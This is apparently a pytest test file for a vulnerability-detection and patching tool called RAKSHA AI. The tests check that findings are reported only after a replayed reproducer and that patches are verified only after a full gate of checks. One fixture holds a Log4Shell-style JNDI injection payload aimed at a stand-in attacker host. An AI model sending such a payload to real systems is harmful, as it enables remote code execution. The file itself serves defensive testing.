"""Tests for the precision invariant.

These are the most important tests in the project. The claim "100% precision on
reports, by construction" is only true if the data model mechanically refuses to let an
unproven finding be reported. Each test below is one way of trying to cheat, and the
assertion is that the attempt raises rather than succeeds.
"""

from __future__ import annotations

import pytest

from raksha.finding import (
    Finding,
    FixSite,
    Frame,
    GATE_ORDER,
    GateCheck,
    InvariantViolation,
    RepairLane,
    ReplayResult,
    Reproducer,
    RoeLevel,
    Signature,
    Status,
    dedup,
    reportable,
    to_sarif_log,
    utcnow,
)


def make_finding(**kw) -> Finding:
    defaults = dict(
        oracle="jazzer:FuzzerSecurityIssueCritical",
        bug_class="CWE-917",
        language="java",
        target="demo-svc",
        message="Jazzer FuzzerSecurityIssueCritical: Remote JNDI Lookup",
        severity="critical",
        frames=[
            Frame(symbol="com.example.svc.AuditLogger.write",
                  uri="com/example/svc/AuditLogger.java", line=48),
            Frame(symbol="com.example.svc.RequestHandler.handle",
                  uri="com/example/svc/RequestHandler.java", line=112),
        ],
    )
    defaults.update(kw)
    return Finding(**defaults)


def fired(signature: str = "abc123") -> ReplayResult:
    return ReplayResult(oracle_fired=True, at=utcnow(), abort_signature=signature,
                        exit_code=77)


def not_fired() -> ReplayResult:
    return ReplayResult(oracle_fired=False, at=utcnow(), exit_code=0)


def a_reproducer() -> Reproducer:
    return Reproducer.from_bytes(
        b"${jndi:ldap://attacker/a}",
        ["java", "-jar", "fuzz.jar", "crash-7f3a"],
        artifact_path="crash-7f3a",
        minimised=True,
    )


def pass_whole_gate(f: Finding) -> None:
    for check in GATE_ORDER:
        f.record_gate(check, True, detail="ok")


# --------------------------------------------------------------- birth state


def test_finding_is_born_suspected_and_unreportable():
    f = make_finding()
    assert f.status is Status.SUSPECTED
    assert not f.is_reportable
    assert f.history[0].to_status is Status.SUSPECTED


# ------------------------------------------- the precision invariant, 3 ways


def test_cannot_confirm_without_a_reproducer():
    """A static-only finding can never be reported. This is the headline guarantee."""
    f = make_finding()
    with pytest.raises(InvariantViolation, match="no reproducer"):
        f.confirm()
    assert f.status is Status.SUSPECTED
    assert not f.is_reportable


def test_cannot_confirm_with_a_reproducer_that_was_never_replayed():
    """Possessing a crashing input is not evidence. Replaying it is."""
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    with pytest.raises(InvariantViolation, match="never replayed"):
        f.confirm()
    assert f.status is Status.SUSPECTED


def test_cannot_confirm_when_the_replay_does_not_fire_the_oracle():
    """A non-reproducing finding is noise, and noise must not reach a reviewer."""
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(not_fired())
    with pytest.raises(InvariantViolation, match="did not fire"):
        f.confirm()
    assert f.status is Status.SUSPECTED


def test_confirm_succeeds_once_the_reproducer_actually_replays():
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()
    assert f.status is Status.CONFIRMED
    assert f.is_reportable
    assert f.time_to_pov_seconds is not None


# ------------------------------------------------------------ the five checks


def test_cannot_verify_before_the_gate_has_run():
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()
    f.mark_patched("--- a/x\n+++ b/x\n", RepairLane.TEMPLATE)
    with pytest.raises(InvariantViolation, match="gate checks not run"):
        f.verify()
    assert f.status is Status.PATCHED


def test_cannot_verify_when_any_single_check_fails():
    """Four of five is not a pass. Nothing unproven ships."""
    for failing in GATE_ORDER:
        f = make_finding()
        f.attach_reproducer(a_reproducer())
        f.record_replay_before(fired())
        f.confirm()
        f.mark_patched("--- a/x\n+++ b/x\n", RepairLane.LLM)
        for check in GATE_ORDER:
            f.record_gate(check, check is not failing)
        f.record_replay_after(not_fired())
        with pytest.raises(InvariantViolation, match=failing.value):
            f.verify()
        assert f.status is Status.PATCHED


def test_cannot_verify_without_re_attacking_the_patched_build():
    """POV_DEAD must have evidence behind it, not just a tick in a dict."""
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()
    f.mark_patched("--- a/x\n+++ b/x\n", RepairLane.TEMPLATE)
    pass_whole_gate(f)
    with pytest.raises(InvariantViolation, match="never re-attacked"):
        f.verify()


def test_cannot_verify_when_the_original_attack_still_works():
    """The gate said POV_DEAD but the replay disagrees. The replay wins."""
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()
    f.mark_patched("--- a/x\n+++ b/x\n", RepairLane.LLM)
    pass_whole_gate(f)
    f.record_replay_after(fired())
    with pytest.raises(InvariantViolation, match="still fires"):
        f.verify()


def test_full_happy_path_to_verified():
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()
    f.add_fix_site(FixSite(uri="com/example/svc/AuditLogger.java", rank=0, start_line=48))
    f.mark_patched("--- a/AuditLogger.java\n+++ b/AuditLogger.java\n",
                   RepairLane.TEMPLATE, model_version="none", prompt_version="v1")
    pass_whole_gate(f)
    f.record_replay_after(not_fired())
    f.verify()

    assert f.status is Status.VERIFIED
    assert f.gate_passed
    assert f.zero_inference is True          # template lane: no model tokens spent
    assert f.time_to_patch_seconds is not None


# --------------------------------------------------------- illegal shortcuts


def test_cannot_skip_straight_from_suspected_to_patched():
    f = make_finding()
    with pytest.raises(InvariantViolation, match="illegal transition"):
        f.mark_patched("--- a/x\n+++ b/x\n", RepairLane.LLM)


def test_cannot_report_only_without_proving_the_bug_first():
    """REPORT_ONLY is a *verified* vulnerability report, never an unproven guess."""
    f = make_finding()
    with pytest.raises(InvariantViolation, match="illegal transition"):
        f.report_only("no patch validated")


def test_verified_is_terminal():
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()
    f.mark_patched("--- a/x\n+++ b/x\n", RepairLane.TEMPLATE)
    pass_whole_gate(f)
    f.record_replay_after(not_fired())
    f.verify()
    with pytest.raises(InvariantViolation):
        f.mark_patched("--- a/x\n+++ b/x\n", RepairLane.LLM)


def test_empty_diff_is_not_a_patch():
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()
    with pytest.raises(InvariantViolation, match="empty diff"):
        f.mark_patched("   \n", RepairLane.LLM)


# ------------------------------------------------------------- the loop path


def test_rejected_patch_returns_to_confirmed_for_another_round():
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()

    f.mark_patched("--- a/x\n+++ b/x\n(round 1)", RepairLane.LLM)
    f.record_gate(GateCheck.DIFFERENTIAL_CORPUS, False,
                  detail="7 corpus inputs changed output", quarantined_inputs=2)
    f.gate_failed("differential corpus: 7 inputs changed output")
    assert f.status is Status.CONFIRMED
    assert f.is_reportable          # still a proven bug; only the fix was refused

    f.mark_patched("--- a/x\n+++ b/x\n(round 2)", RepairLane.LLM)
    pass_whole_gate(f)
    f.record_replay_after(not_fired())
    f.verify()
    assert f.status is Status.VERIFIED
    assert f.repair_rounds == 2


def test_report_only_when_no_patch_validates():
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()
    f.report_only("3 repair rounds exhausted, no candidate cleared the gate")
    assert f.status is Status.REPORT_ONLY
    assert f.is_reportable          # proven real, honestly reported, no fix claimed


# ------------------------------------------------------------ dedup + scoring


def test_dedup_collapses_the_same_bug_reached_by_different_inputs():
    a = make_finding()
    b = make_finding(message="same bug, different input")
    c = make_finding(bug_class="CWE-89", frames=[Frame(symbol="other.Dao.find",
                                                       uri="other/Dao.java", line=9)])
    assert a.dedup_key() == b.dedup_key()
    assert a.dedup_key() != c.dedup_key()
    assert len(dedup([a, b, c])) == 2


def test_dedup_key_ignores_build_path_differences():
    """The same bug built in two directories must not look like two bugs."""
    a = make_finding(frames=[Frame(symbol="parse_header", uri="/src/target/src/parser.c", line=142)])
    b = make_finding(frames=[Frame(symbol="parse_header", uri="/build/x/src/parser.c", line=142)])
    assert a.dedup_key() == b.dedup_key()


def test_reportable_excludes_suspected_findings():
    proven = make_finding()
    proven.attach_reproducer(a_reproducer())
    proven.record_replay_before(fired())
    proven.confirm()
    static_only = make_finding(oracle="semgrep", message="possible injection")

    assert reportable([proven, static_only]) == [proven]


def test_roe_level_is_carried_on_the_record():
    f = make_finding(roe_level=RoeLevel.R2)
    assert f.proof_block()["roe_level"] == "R2"


def test_signatures_land_in_the_proof_block():
    f = make_finding()
    f.add_signature(Signature(key_id="k1", signer="Maj A", signature="sig", at=utcnow()))
    f.add_signature(Signature(key_id="k2", signer="Capt B", signature="sig", at=utcnow()))
    assert len(f.proof_block()["signatures"]) == 2


# ------------------------------------------------------------------- SARIF


def test_sarif_log_is_well_formed_and_carries_the_proof_block():
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()

    log = to_sarif_log([f])
    assert log["version"] == "2.1.0"
    assert len(log["runs"]) == 1

    run = log["runs"][0]
    assert run["tool"]["driver"]["name"] == "RAKSHA AI"
    assert run["tool"]["driver"]["rules"][0]["id"] == "CWE-917"

    result = run["results"][0]
    assert result["ruleId"] == "CWE-917"
    assert result["level"] == "error"
    assert result["locations"][0]["physicalLocation"]["region"]["startLine"] == 48
    assert result["partialFingerprints"]["raksha/dedupKey"] == f.dedup_key()

    proof = result["properties"]["raksha/proof"]
    assert proof["status"] == "CONFIRMED"
    assert proof["reproducer"]["artifact_sha256"] == f.reproducer.artifact_sha256
    assert proof["replay_before"]["oracle_fired"] is True
    assert proof["gate"]["DIFFERENTIAL_CORPUS"] is None     # not run yet


def test_sarif_log_is_json_serialisable():
    import json

    f = make_finding()
    assert json.loads(json.dumps(to_sarif_log([f])))


# ------------------------------------------- stale gate results (regression)


def test_a_new_candidate_patch_cannot_inherit_the_previous_round_s_passes():
    """Regression: round 2 must earn all five checks itself.

    The hazard: round 1 passes four checks and fails the fifth, so the finding goes
    back for another round. If the gate dict were not cleared, round 2 could re-run
    only the check that failed, pass it, and reach VERIFIED carrying four passes that
    were earned by a *different patch*. That ships an untested patch through the gate --
    the exact failure the gate exists to prevent.
    """
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()

    # Round 1: four checks pass, the differential corpus rejects it.
    f.mark_patched("--- a/x\n+++ b/x\n(round 1)", RepairLane.LLM)
    f.record_gate(GateCheck.COMPILES, True)
    f.record_gate(GateCheck.POV_DEAD, True)
    f.record_gate(GateCheck.COVERAGE_HELD, True)
    f.record_gate(GateCheck.CLEAN_REFUZZ, True)
    f.record_gate(GateCheck.DIFFERENTIAL_CORPUS, False, detail="3 inputs changed output")
    f.gate_failed("differential corpus")

    # Round 2: a new patch, and only the previously-failing check is re-run.
    f.mark_patched("--- a/x\n+++ b/x\n(round 2)", RepairLane.LLM)
    assert f.gate == {}, "a new candidate must start with an empty gate"
    f.record_gate(GateCheck.DIFFERENTIAL_CORPUS, True, detail="corpus identical")
    f.record_replay_after(not_fired())

    with pytest.raises(InvariantViolation, match="gate checks not run"):
        f.verify()
    assert f.status is Status.PATCHED

    # The history still remembers every verdict, including the rejection.
    assert len(f.gate_history) == 6
    assert len([r for r in f.gate_history
                if r.check is GateCheck.DIFFERENTIAL_CORPUS]) == 2


def test_gate_history_is_append_only_across_rounds():
    f = make_finding()
    f.attach_reproducer(a_reproducer())
    f.record_replay_before(fired())
    f.confirm()

    f.mark_patched("--- a/x\n+++ b/x\n(r1)", RepairLane.LLM)
    f.record_gate(GateCheck.COMPILES, False, detail="does not compile")
    f.gate_failed("compile failure")

    f.mark_patched("--- a/x\n+++ b/x\n(r2)", RepairLane.LLM)
    pass_whole_gate(f)
    f.record_replay_after(not_fired())
    f.verify()

    assert f.status is Status.VERIFIED
    compiles = [r for r in f.gate_history if r.check is GateCheck.COMPILES]
    assert [r.passed for r in compiles] == [False, True]
